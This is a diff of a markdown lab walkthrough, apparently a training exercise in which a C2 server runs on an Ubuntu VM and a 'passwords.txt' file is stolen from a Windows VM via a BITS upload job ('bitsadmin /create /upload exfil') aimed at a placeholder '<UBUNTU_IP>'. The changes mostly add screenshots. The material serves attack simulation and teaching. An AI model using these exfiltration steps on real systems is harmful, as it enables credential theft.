@@ -311,6 +311,8 @@ Now that you have access to the target, you need a server capable of understandi
 
 - Open a NEW Terminal on your Ubuntu VM (leave your SSH session open in the other window).
 
+<img width="588" height="320" alt="image" src="https://github.com/user-attachments/assets/bc5e80e8-6389-4097-b3d3-fabcaf30e274" />
+
 - Activate the virtual environment in this new terminal as well:
 
 ```Bash
@@ -324,10 +326,10 @@ cd ~/BnB/Leviathan
 sudo ./venv/bin/python3 c2_server.py --port 80
 ```
 
-[!NOTE]
-Copy your '<UBUNTU_IP>', you will need it to know where to exfiltrate the data from the Windows machine. Keep this terminal open to watch the logs!
+>[!IMPORTANT]
+>Copy your '<UBUNTU_IP>', you will need it to know where to exfiltrate the data from the Windows machine. Keep this terminal open to watch the logs!
 
-
+<img width="939" height="518" alt="image" src="https://github.com/user-attachments/assets/9843fee2-aa9a-4b60-aa14-35b42be3a0ab" />
 
 ## Phase 4: Exfiltration via BITS - Windows VM
 
@@ -339,11 +341,16 @@ Switch back to the terminal where you are connected to the Windows machine via S
 Get-Content C:\Users\victim\Desktop\Labs\LeviathanLab\passwords.txt
 ```
 
+<img width="786" height="149" alt="image" src="https://github.com/user-attachments/assets/90431068-f5ff-4c53-ba03-92e15ab59447" />
+
 - We will create a BITS job named "exfil" and configure it as an upload task:
 
 ```PowerShell
 bitsadmin /create /upload exfil
 ```
+
+<img width="681" height="184" alt="image" src="https://github.com/user-attachments/assets/c255e50d-a699-4bcc-aef0-df2ca8717de4" />
+
 
 - Next, we add our sensitive file to the job. The first argument is the remote attacker URL, and the second is the local path of the file. Make sure to replace <UBUNTU_IP> with your actual Ubuntu IP address:
 
